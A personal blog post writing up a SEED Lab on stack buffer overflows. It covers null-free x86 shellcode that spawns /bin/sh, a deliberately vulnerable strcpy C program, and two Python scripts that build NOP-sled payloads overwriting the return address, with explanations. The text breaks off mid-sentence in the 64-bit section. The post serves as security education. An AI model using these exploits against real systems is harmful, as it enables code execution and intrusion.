---
layout: post
title: Buffer Overflow - Part 1
excerpt:
categories: [assembly, shellcode]
---

In this post, I aim to document my findings and observations while performing a SEED Lab.


A shellcode is a piece of code that is used to spawn a command shell or execute specific commands. It is usually written in assembly (a low-level programming language that is specific to a particular computer architecture or processor). Because computers can either be 32-bit or 64-bit, shellcodes will have to be written for specific architectures, however, 64bit computers can always run 32-bit shellcodes.


Given an assembly code `test.s`, such code can be compiled using nasm 

- on linux:

  - `nasm -f elf32 test.s -o test.o` (for 32-bit)
 
  - `ld -m elf_i386 test.o -o test` (for 32-bit)
 
  - `nasm -f elf32 test.s -o test.o` (for 64-bit)
 
  - `ld -m elf_x86_64 test.o -o test` (for 64-bit)

- on windows:

  - `nasm -f win32 test.s -o test.o` (for 32-bit)
 
  - `nasm -f win64 test.s -o test.o` (for 64-bit)
 
  - `gcc test.obj -o test.exe`


In a buffer overflow attack, we need to make use of the machine code, not the assembly code or executable as we need to include the shellcode in our attacking
code. Thus we need to extract the machine code from the executable file or the object file. One way is to use the objdump command.

- `objdump -Mintel --disassemble test.o`

To make it easy to copy the machine code, we can perform further processing on the output.

- `objdump -Mintel --disassemble test.o | cut -f2 | sed 's/ //g' | tr -d '\n'`

<br>

### Using the shellcode in attacking code.

In many cases of buffer-overflow, the vulnerability is caused by the strcpy() function. For the strcpy() function, zero is considered as the end of the string. Therefore, if there is a zero in the middle of the shellcode, the strcpy() fuction will end abruptly, causing the attack to fail. It is therefore necessary that there is no zero in the machine code.

There are many techniques that can get rid of zeros from the shellcode:

<details>
<summary>xoring the 32-bit registers and pushing it to the stack</summary>

  ```assembly
  xor eax eax
  push eax
  ```

</details>

<details>
<summary>assigning an 8-bit number to one of the 8-bits registers</summary>

  ```assembly
  xor eax eax
  mov al, 0x99
  push eax
  ```

</details>

<details>
<summary>using bit-shift to replace filler characters i.e. to turn "xyz#" into "xyz\0"</summary>

  ```assembly
  ;for computers that are little endian i.e. like reading from right to left
  mov eax "xyz#"
  shl eax, 8
  shr eax, 8
  push eax

  ;for computers that are big endian i.e. like reading from left to right
  mov eax "xyz#"
  shr eax, 8
  shl eax, 8
  push eax
  ```

</details>

####  Providing Arguments for System Calls

Linux provides the programmer with system calls that can be easily executed from assembly. These system calls are triggered by using interrupts. `int 0x80` is used to tell the linux kernel to use the EAX, EBX, ECX, and EDX registers to call a function.

When making a system call the 32-bit registers are interpreted as follows:
EAX: this is used to store the function to be called
EBX: this is used to store the first argument to the function
ECX: this is used to store the second argument to the function
EDX: this is used to store the third argument to the function

So in the case of execve we have the function definition as:

```
execve(const char *pathname, char *const _Nullable argv[],
                  char *const _Nullable envp[])
```

This means EAX would store the execve function itself (execve has a system call number of 11), EBX would store the pathname (which in this case is /bin/sh), ECX would store argv[] (which includes the pathname, the arguments, and a null terminator), and EDX would store envp[] (which is the environment variables).

<details>
<summary>Seed lab code</summary>

```assembly
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor eax, eax
      push eax ; Use 0 to terminate the string
      push "//sh" ;
      push "/bin"
      mov ebx, esp ; Get the string address
      ; Construct the argument array argv[]
      push eax ; argv[1] = 0
      push ebx ; argv[0] points to the cmd string
      mov ecx, esp ; Get the address of argv[]
      ; For environment variable
      xor edx, edx ; No env variable
      ; Invoke execve()
      xor eax, eax ; eax = 0x00000000
      mov al, 0x0b ; eax = 0x0000000b
      int 0x80
```

</details>

<details>
<summary>My solution to <code>/bin/sh -c "ls -la"</code></summary>

```assembly
section .text
  global _start
    _start:
      ; Store the "ls -la" string on stack
      mov edx, "la  "
      shl edx, 16
      shr edx, 16
      push edx
      push "ls -"
      mov edx, esp     ; Get the string address for "ls -la"
      
      ; Store the "-c" string on stack
      mov ecx, "-c  "
      shl ecx, 16
      shr ecx, 16
      push ecx
      mov ecx, esp     ; Get the string address for "-c"
      
      ; Store the "/bin/sh" string on stack
      mov ebx, "/sh "
      shl ebx, 8
      shr ebx, 8
      push ebx
      push "/bin"
      mov  ebx, esp     ; Get the string address for "/bin/sh"

      ; Construct the argument array argv[]
      xor eax, eax      ; ensure eax = 0x00000000
      push eax          ; argv[3] = 0
      push edx          ; argv[2] points to "ls -la"
      push ecx          ; argv[1] points to "-c"
      push ebx          ; argv[0] points to "/bin/sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
```

</details>

<details>
<summary>My solution to <code>/usr/bin/env</code> (supplying environment variables)</summary>

```assembly
section .text
  global _start
    _start:    
      ; Store the environment variable string on the stack
      xor eax, eax
      push eax
      push "1234"
      push "aaa="
      mov eax, esp      ; Get the string address for "aaa=1234"
      
      xor ebx, ebx
      push ebx
      push "5678"
      push "bbb="
      mov ebx, esp      ; Get the string address for "bbb=5678"
      
      mov ecx, "4   "
      shl ecx, 24
      shr ecx, 24
      push ecx
      push "=123"
      push "cccc"
      mov ecx, esp      ; Get the string address for "cccc=1234"
   
      ; For environment variable
      xor  edx, edx     ; edx = 0
      push edx          ; argv[3] = 0
      push eax          ; argv[2] points to "aaa=1234"
      push ebx          ; argv[1] points to "bbb=5678"
      push ecx          ; argv[0] points to "cccc=1234"
      mov edx, esp      ; Get the address of env[]
      
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "/env"
      push "/bin"
      push "/usr"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/usr/bin/env"
      mov  ecx, esp     ; Get the address of argv[]

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
```

</details>

#### Using Code Segment

Rather than dynamically constructing all the necessary data structures on the stack, so their addresses can be obtained from the stack pointer `esp`, data can be stored in the code region, and its address is obtained via the function call mechanism.

<details>
<summary>My solution to <code>/bin/sh -c "ls -la"</code> using code segment</summary>

```assembly
section .text
  global _start
    _start:
        BITS 32
	    jmp short two
    one:
 	    pop esi
     	    xor eax, eax
 	
 	    mov [esi+7],  al   ; /bin/sh%0
 	    mov [esi+10], al   ; -c%0
 	    mov [esi+17], al   ; ls -la%0
 	
 	    mov [esi+18], esi  ; put address of "/usr/bin/env" in AAAA
 	
 	    lea ebx, [esi+8]   ; get address of "-c"
 	    mov [esi+22], ebx  ; put address of "-c" in BBBB
 	
 	    lea ebx, [esi+11]  ; get address of "ls -la"
 	    mov [esi+26], ebx  ; put address of "ls -la" in CCCC
 	    
 	    mov [esi+30], eax  ; put NULL in DDDD
 	
 	    mov al,  0x0b      ; pass the execve syscall number as argument
 	    mov ebx, esi
 	    lea ecx, [esi+18]  ; /bin/sh -c "ls -la"
 	    lea edx, [esi+30]  ; NULL

 	    int 0x80           ; execve
    two:
 	    call one
 	    db '/bin/sh*-c*ls -la*AAAABBBBCCCCDDDD'
 	       ;01234567890123456789012345678901234
 	       ;          1         2         3
```

</details>

<details>
<summary>My solution to <code>/usr/bin/env</code> (supplying environment variables) using code segment</summary>

```assembly
section .text
  global _start
    _start:
        BITS 32
	    jmp short two
    one:
 	    pop esi
     	xor eax, eax
 	
 	    mov [esi+12], al   ; /usr/bin/env%0
 	    mov [esi+17], al   ; a=11%0
 	    mov [esi+23], al   ; bb=22%0
 	    mov [esi+32], al   ; ccc=4567%0
 	
 	    mov [esi+33], esi  ; address of /usr/bin/env in AAAA
 	    mov [esi+37], eax  ; put NULL in BBBB (to indicate end of array)
 	
 	    lea ebx, [esi+13]  ; get address of a=11
 	    mov [esi+41], ebx  ; address of a=11 in CCCC
 	
 	    lea ebx, [esi+18]  ; get address of bb=22
 	    mov [esi+45], ebx  ; address of bb=22 in DDDD
 	    
 	    lea ebx, [esi+24]  ; get address of ccc=4567
 	    mov [esi+49], ebx  ; address of ccc=4567 in EEEE
 	
 	    mov al,  0x0b      ; pass the execve syscall number as argument
 	    mov ebx, esi
 	    lea ecx, [esi+33]  ; /usr/bin/env
 	    lea edx, [esi+41]  ; a=11,bb=22,ccc=4567

 	    int 0x80           ; execve
    two:
 	    call one
 	    db '/usr/bin/env*a=11*bb=22*ccc=4567*AAAABBBBCCCCDDDDEEEE'
 	    ;   01234567890123456789012345678901234567890123456789012
 	    ;             1         2         3         4         5 
```

</details>

___

Writing 64-bit shellcode is not too different to writing 32-bit shellcode. The differences are mainly in the registers. For the x64 architecture, invoking system call
is done through the syscall instruction, and the first three arguments for the system call are stored in the rdx, rsi, rdi registers, respectively.
<details>
<summary>64-bit equivalent registers</summary>

- eax = rax
- ebx = rdi
- ecx = rsi
- edx = rdx

</details>

<br>

###  Launching Attack on 32-bit Program When the Buffer Size is Known

When exploiting buffer-overflow vulnerability, to be successful, you need to know the distance between the buffer's starting position and where the return-address is stored.

When the vulnerable program is run, our malicious code is copied on the stack, however, we do not know the memory address of the buffer and base-pointer. Since the source code is available to us, we know the buffer size from the code and we can compile it with gcc `-g` flag so debugging information can be added to the binary. 

<details>
<summary>Book code for vulnerable program</summary>

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);       

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r"); 
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    dummy_function(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}

// This function is used to insert a stack frame of size 
// 1000 (approximately) between main's and bof's stack frames. 
// The function itself does not do anything. 
void dummy_function(char *str)
{
    char dummy_buffer[1000];
    memset(dummy_buffer, 0, 1000);
    bof(str);
}
```

</details>

Now we can get the required values needed to prepare the exploit by running gdb

**image**

```
the stack is built from high address to low address (top to bottom)
the return address is stored in $ebp + 4
this means that the return address is stored in &buffer + (&buffer - $ebp) + 4
the return address value must contain a value that will jump straight to our shellcode.

Thus, for our exploit to work, we have to replace the return address stored in ($ebp + 4) to a value that will jump straight to our shellcode. But we do not know the address value where our shellcode is stored. To remedy this, we fill the whole buffer? with NOPs so that as long as we can jump to an NOP, we will surely get to our shellcode.

NOPs are used to indicate that no action should be taken at a particular point in the program, but rather advance the program.
```

Thus the following code can be used to exploit the buffer-overflow vulnerability (Note: address randomization is disabled)

```python
#!/usr/bin/python3
import sys

# the actual shellcode
shellcode= (
   "\xeb\x15\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b"
   "\x08\x31\xd2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff\x2f\x62\x69\x6e"
   "\x2f\x73\x68\x2a\x41\x41\x41\x41\x42\x42\x42\x42"
).encode('latin-1')


# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode at the end of the payload
start = 517 - len(shellcode)
content[start:] = shellcode

##################################################################
# Record the address values of $ebp, &buffer, and byte size
ebp = 0xffffcb68
buffer = 0xffffcafc
L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

# Decide the return address value and place it in the payload
ret    = buffer + (ebp - buffer) + 100           # or 'ret = ebp + 80' (we might need to adjust '80')
offset = (ebp - buffer) + L                      # place 'ret' after $ebp 

content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

<details>
<summary>Brief explanation of exploit code</summary>

The vulnerable program reads the first 517bytes from a file. Thus the aim of the exploit code is to produce a file that is only 517bytes and fill it with NOPs. This will form the base for exploit.

```python
content = bytearray(0x90 for i in range(517)) 
```

Next we need to place the shellcode at the end of the file so that we can jump to with by jumping to any NOP region. The more the NOP region, the better our chance of reaching the shellcode

```python
start = 517 - len(shellcode)
content[start:] = shellcode
```

We also need to replace the original return address with a return address that will jump to an NOP region. Since we were able to get the values of `$ebp` and `&buffer`, we can calculate exactly the offset where the original return address is stored (this after `$ebp`). Thus the offset can be calculated with (`&buffer` - `$ebp` + 4). We need to calculate a new return address that we will place in `$ebp` + 4. This return address will have to be greater than `$ebp`, thus the new return address will be the `$ebp` address plus some number of bytes offset. We would need to adjust this number till the address points to an NOP region.

```python
ret    = buffer + (ebp - buffer) + 100
offset = (ebp - buffer) + L
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
```

Finally with the exploit set, we write it to the file where the vulnerable program gets input from
```python
with open('badfile', 'wb') as f:
  f.write(content)
```

</details>

**image**

<br>

###  Launching Attack without Knowing Buffer Size (Level 2)

Let us assume that we do not know the actual buffer size, but we do know the range of the buffer size, which is from 100 to 200 bytes. Using gdb, we can obtain the buffer address but that is all we would use gdb for.

**image**

The following code can be used to exploit the buffer-overflow vulnerability (Note: address randomization is disabled)

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
   "\xeb\x15\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b"
   "\x08\x31\xd2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff\x2f\x62\x69\x6e"
   "\x2f\x73\x68\x2a\x41\x41\x41\x41\x42\x42\x42\x42"
).encode('latin-1')


# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode at the end of the payload
start = 517 - len(shellcode)               
content[start:] = shellcode

##################################################################
# Record the values of &buffer and byte size
buffer = 0xffffca90
L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
max_buffs = 200                                 # We know that the buffer is within the range of 100 to 200.

##################################################################
# Decide the return address value and place it in the payload
ret = buffer + max_buffs + 100                  # Return address should point to one of the NOPs region.

# Spray the first max_buffs
for _ in range(0, max_buffs + L, L):
    content[_:_ + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

<details>
<summary>Brief explanation of exploit code</summary>

The vulnerable program reads the first 517bytes from a file. Thus the aim of the exploit code is to produce a file that is only 517bytes and fill it with NOPs. This will form the base for exploit.

```python
content = bytearray(0x90 for i in range(517)) 
```

Next we need to place the shellcode at the end of the file so that we can jump to with by jumping to any NOP region. The more the NOP region, the better our chance of reaching the shellcode

```python
start = 517 - len(shellcode)
content[start:] = shellcode
```

We also need to replace the original return address with a return address that will jump to an NOP region. Since we know the buffer address, we can fill every region from the start of the buffer address to above (buffer_address + max_buffer_size). This way, we are sure to overwrite the original return address with a value that points to an NOP region.
To achieve this, we spray the value of the new return address from begging of buffer till above max buffer size.

```python
ret = buffer + max_buffs + 100

for _ in range(0, max_buffs + L, L):
    content[_:_ + L] = (ret).to_bytes(L,byteorder='little') 
```

Finally with the exploit set, we write it to the file where the vulnerable program gets input from
```python
with open('badfile', 'wb') as f:
  f.write(content)
```

</details>

**image**

### Launching Attack on 64-bit Program

In this task, we will compile the vulnerable program into a 64-bit binary called stack-L3. We will launch
attacks on this program. The compilation and setup commands are already included in Makefile. Similar
to the previous task, detailed explanation of your attack needs to be provided in the lab report.
Using gdb to conduct an investigation on 64-bit programs is the same as that on 32-bit programs. The
only difference is the name of the register for the frame pointer. In the x86 architecture, the frame pointer is
ebp, while in the x64 architecture, it is rbp.
Challenges. Compared to buffer-overflow attacks on 32-bit machines, attacks on 64-bit machines is more
difficult. The most difficult part is the address. Although the x64 architecture supports 64-bit address space,
only the address from 0x00 through 0x00007FFFFFFFFFFF is allowed. That means for every address
(8 bytes), the highest two bytes are always zeros. This causes a problem.
In our buffer-overflow attacks, we need to store at least one address in the payload, and the payload will
be copied into the stack via strcpy(). We know that the strcpy() function will stop copying when




